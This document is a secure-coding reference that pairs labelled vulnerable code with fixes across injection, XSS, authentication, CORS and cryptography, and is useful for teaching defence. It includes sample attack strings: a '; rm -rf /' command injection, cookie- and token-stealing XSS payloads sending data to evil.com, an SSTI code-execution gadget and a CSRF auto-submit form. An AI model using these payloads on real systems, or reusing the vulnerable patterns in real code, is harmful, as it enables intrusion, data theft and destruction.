---
title: "Security Anti-Patterns in Practice"
category: "Application Security"
tags:
  - security
  - vulnerabilities
  - injection
  - authentication
  - authorization
  - CSRF
  - CORS
  - cryptography
  - dependency-management
  - OWASP
source_type: professional_knowledge
audience: all_developers
created: 2026-03-03
---

# Security Anti-Patterns in Practice

Security vulnerabilities follow predictable patterns. The same classes of mistakes
show up in codebase after codebase, decade after decade. This reference catalogs the
most common security anti-patterns with vulnerable code, fixed code, and the reasoning
behind each fix.

**Guiding principle:** Security is not a feature you bolt on. It is a property of
how every line of code is written.

---

## 1. Injection Attacks

Injection occurs when untrusted input is interpreted as code or commands. It remains
the most exploited vulnerability class in software.

### 1.1 SQL Injection

| Aspect | Detail |
|--------|--------|
| Root cause | String concatenation of user input into SQL |
| Impact | Full database read/write, data exfiltration, authentication bypass |
| Prevalence | OWASP Top 10 since its inception |

**Vulnerable code:**

```python
# DANGEROUS: user input concatenated directly into query
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)
    return cursor.fetchone()

# Attack input: ' OR '1'='1' --
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# Returns: every user in the database
```

**Fixed code:**

```python
# SAFE: parameterized query — database driver handles escaping
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchone()
```

**ORM example (also safe):**

```python
# SAFE: ORM parameterizes automatically
user = User.objects.get(username=username)
```

**Key rules:**
- Never concatenate user input into SQL strings
- Use parameterized queries (prepared statements) in every language
- ORMs are safe by default, but watch for raw query escape hatches
- Even stored procedures can be vulnerable if they build dynamic SQL internally

### 1.2 Command Injection

```python
# DANGEROUS: user input passed to shell
import os
def ping_host(host):
    os.system("ping -c 1 " + host)

# Attack input: 127.0.0.1; rm -rf /
# Executes: ping -c 1 127.0.0.1; rm -rf /
```

```python
# SAFE: use subprocess with argument list (no shell interpretation)
import subprocess
def ping_host(host):
    subprocess.run(["ping", "-c", "1", host], check=True)
```

**Key rules:**
- Never pass user input to `os.system()`, `eval()`, `exec()`, or backticks
- Use language-native APIs that avoid shell interpretation
- If shell is unavoidable, use strict allowlists for input values

### 1.3 Cross-Site Scripting (XSS)

Three variants, same root cause: user-controlled data rendered as executable HTML/JS.

#### Stored XSS

```html
<!-- DANGEROUS: raw user content rendered without escaping -->
<div class="comment-body">
  {{ comment.body | safe }}
</div>

<!-- If comment.body contains: <script>fetch('https://evil.com/steal?c='+document.cookie)</script> -->
<!-- Every visitor executes the attacker's script -->
```

```html
<!-- SAFE: auto-escaped output (default in most template engines) -->
<div class="comment-body">
  {{ comment.body }}
</div>
<!-- Output: &lt;script&gt;fetch(... — rendered as harmless text -->
```

#### Reflected XSS

```javascript
// DANGEROUS: query parameter reflected into page without encoding
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});
// URL: /search?q=<script>alert(document.cookie)</script>
```

```javascript
// SAFE: encode output before rendering
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${escapeHtml(req.query.q)}</h1>`);
});
```

#### DOM-Based XSS

```javascript
// DANGEROUS: innerHTML with user-controlled data
document.getElementById('output').innerHTML = location.hash.slice(1);
// URL: page.html#<img src=x onerror=alert(1)>
```

```javascript
// SAFE: use textContent instead of innerHTML
document.getElementById('output').textContent = location.hash.slice(1);
```

**XSS defense checklist:**

| Defense | Layer |
|---------|-------|
| Context-aware output encoding | Primary |
| Content Security Policy (CSP) headers | Secondary |
| HttpOnly flag on session cookies | Limits damage |
| Input validation (allowlisting) | Additional |
| Use framework auto-escaping, avoid `| safe` / `dangerouslySetInnerHTML` | Prevention |

### 1.4 Template Injection (SSTI)

```python
# DANGEROUS: user input used as template string
from jinja2 import Template
def render_greeting(name):
    template = Template("Hello " + name)
    return template.render()

# Attack input: {{ config.items() }}
# Leaks: server configuration, secrets, internal paths
# Worse: {{ ''.__class__.__mro__[1].__subclasses__() }} — arbitrary code execution
```

```python
# SAFE: user input passed as data, never as template code
from jinja2 import Template
def render_greeting(name):
    template = Template("Hello {{ name }}")
    return template.render(name=name)
```

**Key rule:** User input is DATA. Templates are CODE. Never let data become code.

---

## 2. Authentication Mistakes

Authentication is the front gate. Every mistake here lets attackers walk right in.

### 2.1 Password Storage

| Method | Status | Problem |
|--------|--------|---------|
| Plaintext | Catastrophic | One breach exposes every password |
| MD5 | Broken | 10+ billion hashes/sec on modern GPU |
| SHA-1 | Broken | Collision attacks demonstrated |
| SHA-256 unsalted | Weak | Rainbow table attacks viable |
| SHA-256 + salt | Insufficient | Still too fast for brute force |
| bcrypt / scrypt / Argon2 | Correct | Designed to be slow, salted by default |

```python
# DANGEROUS: storing password hash with MD5
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
```

```python
# DANGEROUS: SHA-256 without salt
password_hash = hashlib.sha256(password.encode()).hexdigest()
```

```python
# SAFE: bcrypt with automatic salt
import bcrypt
# Hashing
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verification
if bcrypt.checkpw(submitted_password.encode(), stored_hash):
    authenticate_user()
```

```python
# ALSO SAFE: Argon2 (current recommendation for new systems)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)

# Hashing
password_hash = ph.hash(password)

# Verification
try:
    ph.verify(stored_hash, submitted_password)
    authenticate_user()
except argon2.exceptions.VerifyMismatchError:
    reject_login()
```

### 2.2 JWT Mistakes

```javascript
// DANGEROUS: storing JWT in localStorage (accessible to any XSS)
localStorage.setItem('token', jwt);

// Any XSS payload can steal it:
// fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

```javascript
// SAFE: store JWT in HttpOnly cookie (inaccessible to JavaScript)
// Server sets:
res.cookie('token', jwt, {
  httpOnly: true,    // no JS access
  secure: true,      // HTTPS only
  sameSite: 'Strict', // CSRF protection
  maxAge: 900000     // 15 min expiry
});
```

**JWT security checklist:**

| Rule | Why |
|------|-----|
| Never store tokens in localStorage or sessionStorage | XSS can steal them |
| Always validate the signature server-side | Unsigned tokens = no authentication |
| Check the `alg` header; reject `none` | `alg: none` attack bypasses signatures |
| Set short expiration times (15-30 min) | Limits window of stolen token use |
| Implement token refresh with rotation | Old refresh tokens should be invalidated |
| Include `iss`, `aud`, `exp` claims and validate them | Prevents token misuse across services |

### 2.3 No Rate Limiting on Login

```python
# DANGEROUS: unlimited login attempts
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        return create_session(user)
    return "Invalid credentials", 401
# Attacker can try millions of passwords without restriction
```

```python
# SAFE: rate limiting with exponential backoff
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if not user:
        log_failed_attempt(request.form['username'])
        return "Invalid credentials", 401
    reset_failed_attempts(user)
    return create_session(user)
```

---

## 3. Authorization Failures

Authentication tells you WHO someone is. Authorization tells you WHAT they can do.
Getting authentication right but authorization wrong means every user is an admin.

### 3.1 Insecure Direct Object References (IDOR)

```python
# DANGEROUS: user can access any invoice by changing the ID
@app.route('/api/invoices/<int:invoice_id>')
def get_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)
    return jsonify(invoice.to_dict())

# User 42 requests /api/invoices/999 — gets user 17's invoice
```

```python
# SAFE: verify the resource belongs to the requesting user
@app.route('/api/invoices/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id  # ownership check
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

### 3.2 Missing Function-Level Access Control

```python
# DANGEROUS: admin endpoint with no role check
@app.route('/admin/delete-user/<int:user_id>', methods=['POST'])
@login_required  # only checks if logged in, not if admin
def delete_user(user_id):
    User.query.get(user_id).delete()
    return "Deleted"
# Any authenticated user can delete any other user
```

```python
# SAFE: explicit role verification
@app.route('/admin/delete-user/<int:user_id>', methods=['POST'])
@login_required
@requires_role('admin')  # checks role in addition to authentication
def delete_user(user_id):
    User.query.get_or_404(user_id).delete()
    audit_log('user_deleted', actor=current_user.id, target=user_id)
    return "Deleted"
```

### 3.3 Role Escalation

```javascript
// DANGEROUS: role sent from client in request body
app.post('/api/register', (req, res) => {
  const user = new User({
    email: req.body.email,
    password: req.body.password,
    role: req.body.role  // attacker sends role: "admin"
  });
  user.save();
});
```

```javascript
// SAFE: role assigned server-side, never from client input
app.post('/api/register', (req, res) => {
  const user = new User({
    email: req.body.email,
    password: req.body.password,
    role: 'user'  // hardcoded default
  });
  user.save();
});
```

**Authorization checklist:**

| Check | Every Request? |
|-------|---------------|
| Is the user authenticated? | Yes |
| Does the user have the required role? | Yes |
| Does the user own the requested resource? | Yes |
| Is the action permitted for this role on this resource? | Yes |
| Is the authorization check on the server (not just UI hiding)? | Yes |

---

## 4. CSRF and Session Issues

### 4.1 Cross-Site Request Forgery (CSRF)

```html
<!-- Attacker's page — victim visits while logged into target site -->
<!-- DANGEROUS if target has no CSRF protection: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- Or for POST requests: -->
<form action="https://bank.com/transfer" method="POST" id="evil">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('evil').submit();</script>
```

**Defenses (use ALL that apply):**

```python
# 1. CSRF tokens (most frameworks provide this)
<form method="POST">
  {{ csrf_token() }}
  <!-- form fields -->
</form>

# 2. SameSite cookie attribute
response.set_cookie('session', value, samesite='Strict')

# 3. For APIs: require custom headers that browsers won't send cross-origin
# Client must send:  X-Requested-With: XMLHttpRequest
# Server validates:  if 'X-Requested-With' not in request.headers: abort(403)
```

### 4.2 Session Security

| Setting | Correct Value | Why |
|---------|--------------|-----|
| `Secure` flag | `True` | Cookie sent only over HTTPS |
| `HttpOnly` flag | `True` | Cookie inaccessible to JavaScript |
| `SameSite` | `Strict` or `Lax` | Prevents cross-site cookie sending |
| Session timeout | 15-30 min idle | Limits stolen session window |
| Regenerate ID on login | Always | Prevents session fixation |
| Regenerate ID on privilege change | Always | Prevents escalation attacks |

```python
# DANGEROUS: session fixation — keeping same session ID after login
@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form['username'], request.form['password']):
        session['user'] = request.form['username']  # same session ID
        return redirect('/dashboard')
```

```python
# SAFE: regenerate session on authentication
@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form['username'], request.form['password']):
        session.regenerate()  # new session ID, old one invalidated
        session['user'] = request.form['username']
        return redirect('/dashboard')
```

---

## 5. Data Exposure

Data leaks are often not from sophisticated attacks but from simple misconfigurations.

### 5.1 Verbose Error Messages

```python
# DANGEROUS: full stack trace shown to users in production
@app.errorhandler(500)
def server_error(e):
    return f"<pre>{traceback.format_exc()}</pre>", 500
# Exposes: file paths, library versions, database schema, internal logic
```

```python
# SAFE: generic message to user, detailed log server-side
@app.errorhandler(500)
def server_error(e):
    app.logger.error(f"Internal error: {traceback.format_exc()}")
    return "An internal error occurred. Reference ID: " + generate_error_id(), 500
```

### 5.2 Debug Mode in Production

```python
# DANGEROUS: debug mode exposes interactive debugger
if __name__ == '__main__':
    app.run(debug=True)  # Werkzeug debugger allows arbitrary code execution
```

```python
# SAFE: debug controlled by environment
import os
if __name__ == '__main__':
    app.run(debug=os.environ.get('FLASK_DEBUG', 'false').lower() == 'true')
```

### 5.3 Exposed Sensitive Files

Files that should NEVER be accessible via web server:

| File | Contains |
|------|----------|
| `.env` | API keys, database credentials, secrets |
| `.git/` | Full source code history |
| `docker-compose.yml` | Infrastructure configuration |
| `*.sql` | Database dumps, schema |
| `node_modules/` | Dependency source code |
| `__pycache__/` | Compiled Python bytecode |
| `*.log` | Application logs, potentially with PII |
| `wp-config.php` | WordPress database credentials |

```nginx
# Nginx: block access to sensitive files
location ~ /\. {
    deny all;
    return 404;
}
location ~* \.(env|git|sql|log|bak|swp|old|orig)$ {
    deny all;
    return 404;
}
```

### 5.4 API Response Over-Exposure

```python
# DANGEROUS: returning full database object
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    user = User.query.get(user_id)
    return jsonify(user.__dict__)
# Exposes: password_hash, internal_notes, admin_flags, SSN, etc.
```

```python
# SAFE: explicit serialization with allowed fields only
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    user = User.query.get_or_404(user_id)
    return jsonify({
        'id': user.id,
        'name': user.display_name,
        'avatar_url': user.avatar_url
        # only public fields — nothing else leaks
    })
```

---

## 6. Dependency Vulnerabilities

Your application is only as secure as its weakest dependency.

### 6.1 Outdated Packages with Known CVEs

```bash
# Check for known vulnerabilities:
npm audit                    # Node.js
pip-audit                    # Python
bundle audit                 # Ruby
dotnet list package --vulnerable  # .NET
```

**Common vulnerable library patterns:**

| Situation | Risk |
|-----------|------|
| Package with known CVE, no update applied | Direct exploit path |
| Major version behind (e.g., lodash 3.x when 4.x is current) | Missing security patches |
| Package abandoned by maintainer | No future patches |
| Package with 0 downloads suddenly appearing as dependency | Possible typosquatting |

### 6.2 Supply Chain Attacks

```json
// DANGEROUS: no lockfile, or lockfile not committed
// package.json
{
  "dependencies": {
    "express": "^4.18.0"  // resolves to different versions on different installs
  }
}
```

```json
// SAFE: commit lockfile, use exact versions for critical dependencies
// package.json
{
  "dependencies": {
    "express": "4.18.2"  // exact version
  }
}
// AND always commit package-lock.json / yarn.lock / pnpm-lock.yaml
```

**Lockfile rules:**

| Rule | Reason |
|------|--------|
| Always commit lockfiles to version control | Reproducible builds |
| Use `npm ci` in CI/CD, not `npm install` | Installs exactly from lockfile |
| Review lockfile diffs in code review | Catch unexpected dependency changes |
| Run `npm audit` / `pip-audit` in CI pipeline | Fail build on known vulnerabilities |
| Pin critical dependencies to exact versions | Prevent surprise updates |

### 6.3 Dependency Audit Pipeline

```yaml
# Example CI step: fail build on vulnerable dependencies
security-audit:
  script:
    - npm ci
    - npm audit --audit-level=high
    # Fails the build if any high or critical vulnerabilities found
```

---

## 7. CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations are among the most common web
security issues. They silently open your API to cross-origin attacks.

### 7.1 Wildcard Origins

```python
# DANGEROUS: allows any website to make authenticated requests
@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
# Browser WILL block this combination, but developers sometimes "fix" it wrong
```

```python
# DANGEROUS: reflecting the Origin header back (effectively wildcard + credentials)
@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin', '*')
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
# Allows ANY site to make authenticated cross-origin requests
```

```python
# SAFE: explicit allowlist of trusted origins
ALLOWED_ORIGINS = {
    'https://app.example.com',
    'https://admin.example.com',
}

@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

### 7.2 CORS Configuration Checklist

| Setting | Recommendation |
|---------|---------------|
| `Access-Control-Allow-Origin` | Specific origin(s), never `*` with credentials |
| `Access-Control-Allow-Methods` | Only methods your API actually uses |
| `Access-Control-Allow-Headers` | Only headers your API actually needs |
| `Access-Control-Max-Age` | Cache preflight (e.g., 3600) to reduce OPTIONS requests |
| `Access-Control-Expose-Headers` | Only headers the client needs to read |
| `Access-Control-Allow-Credentials` | `true` only if cookies/auth needed cross-origin |

### 7.3 Preflight Mistakes

```javascript
// Common confusion: "simple requests" skip preflight
// These DO trigger preflight:
// - Methods other than GET, HEAD, POST
// - Content-Type other than application/x-www-form-urlencoded, multipart/form-data, text/plain
// - Any custom headers (e.g., Authorization, X-Custom-Header)

// DANGEROUS: server doesn't handle OPTIONS method
// Result: preflight fails, request blocked silently, developer disables CORS entirely
```

```javascript
// SAFE: proper preflight handler
app.options('/api/*', (req, res) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.set('Access-Control-Max-Age', '3600');
  }
  res.status(204).send();
});
```

---

## 8. Cryptography Mistakes

Cryptography is one of the few areas where "close enough" is meaningless. A small
mistake can render the entire system insecure.

### 8.1 Rolling Your Own Crypto

```python
# DANGEROUS: custom "encryption" function
def encrypt(text, key):
    result = ""
    for i, char in enumerate(text):
        result += chr(ord(char) ^ ord(key[i % len(key)]))
    return result
# This is a simple XOR cipher — trivially breakable
```

**Rule: NEVER implement your own cryptographic algorithms.** Use established
libraries: `cryptography` (Python), `libsodium` / `tweetnacl` (JS/C),
`javax.crypto` (Java), `crypto/aes` (Go).

### 8.2 ECB Mode

```python
# DANGEROUS: ECB mode encrypts identical blocks to identical ciphertext
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)
# Patterns in plaintext are visible in ciphertext (the "ECB penguin" problem)
```

```python
# SAFE: use AES-GCM (authenticated encryption)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)  # unique per encryption
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
# Provides both confidentiality AND integrity
```

### 8.3 Hardcoded IVs and Keys

```python
# DANGEROUS: same IV used for every encryption
IV = b'\x00' * 16  # fixed initialization vector
cipher = AES.new(key, AES.MODE_CBC, IV)
# Identical plaintexts produce identical ciphertexts — defeats the purpose
```

```python
# SAFE: random IV for every encryption, stored alongside ciphertext
import os
iv = os.urandom(16)  # unique per encryption
cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = iv + cipher.encrypt(pad(plaintext))
# IV is not secret — it just must be unique
```

### 8.4 Encryption vs Hashing Confusion

| Operation | Purpose | Reversible? | Use For |
|-----------|---------|-------------|---------|
| Encryption | Confidentiality | Yes (with key) | Data you need to read later |
| Hashing | Integrity/Verification | No | Passwords, checksums, signatures |
| Encoding | Format conversion | Yes (no key) | Base64, URL encoding — NOT security |

```python
# DANGEROUS: using encryption for passwords (reversible = stealable)
encrypted_password = aes_encrypt(password, master_key)
# If master_key is compromised, ALL passwords are exposed instantly

# DANGEROUS: using encoding and calling it encryption
"encrypted" = base64.b64encode(password.encode())
# Base64 is NOT encryption — it is trivially reversible
```

```python
# SAFE: hashing for passwords (irreversible)
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# Even if stolen, original password cannot be recovered
```

### 8.5 Weak Key Generation

```python
# DANGEROUS: predictable key from insufficient entropy
import random
key = ''.join(random.choice('abcdef0123456789') for _ in range(32))
# random module uses Mersenne Twister — predictable, NOT cryptographically secure
```

```python
# SAFE: cryptographically secure random generation
import secrets
key = secrets.token_hex(32)  # 256 bits of cryptographic randomness

# Or for bytes:
import os
key = os.urandom(32)
```

**Crypto decision table:**

| Need | Use | Never Use |
|------|-----|-----------|
| Password storage | Argon2, bcrypt, scrypt | MD5, SHA-1, SHA-256 alone, encryption |
| Symmetric encryption | AES-256-GCM | DES, 3DES, AES-ECB, RC4, Blowfish |
| Asymmetric encryption | RSA-OAEP (2048+ bit), ECIES | RSA with PKCS#1 v1.5 padding |
| Digital signatures | Ed25519, ECDSA, RSA-PSS | RSA PKCS#1 v1.5 signatures |
| Random values | `os.urandom()`, `secrets`, `/dev/urandom` | `Math.random()`, `random.random()` |
| Key derivation | HKDF, PBKDF2 (high iterations) | Single-pass hash |

---

## Quick Reference: Security Headers

Every web application should set these HTTP response headers:

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'` (customize per app) | Prevents XSS, data injection |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS |
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevents clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer leakage |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Restricts browser features |
| `X-XSS-Protection` | `0` (disable, rely on CSP instead) | Legacy; can cause issues if enabled |

---

## Quick Reference: Input Validation

| Strategy | Description | When to Use |
|----------|-------------|-------------|
| Allowlisting | Accept only known-good values | Dropdown choices, enum fields, formats |
| Type checking | Enforce expected type (int, email, UUID) | All structured inputs |
| Length limits | Set max (and min) length | All text inputs |
| Range checks | Enforce numeric boundaries | Quantities, prices, dates |
| Regex validation | Match expected pattern | Phone numbers, postal codes |
| Sanitization | Remove/encode dangerous characters | HTML output, filenames |

**Never rely on client-side validation alone.** Server-side validation is the
security boundary. Client-side validation is a UX convenience.

---

## Gal's Application: 10 Daily Security Rules

1. **Every query is parameterized.** If I see string concatenation building a SQL
   query, a shell command, or an LDAP filter, I flag it immediately. No exceptions,
   no "but the input is trusted" excuses.

2. **Passwords are hashed with bcrypt or Argon2.** If I see MD5, SHA-1, SHA-256
   without a proper KDF, or any form of reversible password storage, it is a
   blocking issue.

3. **Authorization checks exist on every endpoint.** I verify that access control
   is enforced server-side, not just by hiding UI elements. I test by requesting
   resources that belong to other users.

4. **Tokens live in HttpOnly cookies, not localStorage.** Any JWT or session token
   stored in localStorage is one XSS away from theft. I check where tokens are
   stored in every authentication review.

5. **Error messages reveal nothing internal.** Stack traces, file paths, database
   errors, and library versions stay in server logs. Users see generic messages
   with reference IDs.

6. **Dependencies are audited before merge.** I check that lockfiles are committed,
   `npm audit` / `pip-audit` runs in CI, and no known-vulnerable packages are
   introduced.

7. **CORS is configured with an explicit allowlist.** I reject wildcard origins,
   reflected origins, and any configuration that pairs `*` with credentials. Every
   CORS header has a reason.

8. **Cryptography uses established libraries and current algorithms.** I reject
   custom crypto, ECB mode, hardcoded IVs, predictable random sources, and any
   confusion between encryption, hashing, and encoding.

9. **CSRF protection is active on all state-changing endpoints.** I verify tokens
   are present on forms, SameSite cookie attributes are set, and APIs require
   non-simple headers that trigger preflight.

10. **Security is reviewed, not assumed.** I do not trust "the framework handles
    it." I verify the framework is configured correctly. I do not trust "we'll add
    security later." Later never comes. Every review includes a security lens.
